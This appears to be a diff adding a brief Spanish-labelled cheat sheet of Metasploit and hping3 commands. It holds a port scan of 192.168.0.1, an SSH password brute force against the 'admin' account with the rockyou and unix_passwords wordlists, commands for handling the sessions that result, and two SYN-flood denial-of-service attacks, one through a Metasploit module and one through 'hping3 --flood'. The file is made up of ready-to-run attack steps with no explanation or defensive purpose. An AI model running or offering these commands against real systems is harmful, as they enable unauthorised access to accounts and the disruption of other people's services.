@@ -1,0 +1,33 @@
+              escáneres 
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.0.1
+set PORTS 1-1000
+set THREADS 20
+run
+
+      desifrardor ataque
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.0.1
+set USERNAME admin
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE true
+set THREADS 15
+run
+set PASS_FILE /root/wordlists/rockyou.txt
+
+
+
+sessions -l
+sessions -i 1
+background
+
+      ataque de saturación de red 
+            SYN.        DoS
+use auxiliary/dos/tcp/synflood
+set RHOST [IP_DEL_OBJETIVO]
+set RPORT 22
+set SHOOTUP 100
+run
+
+        ataque multiplicación 
+sudo hping3 -S --flood -V -p 80 192.168.0.1
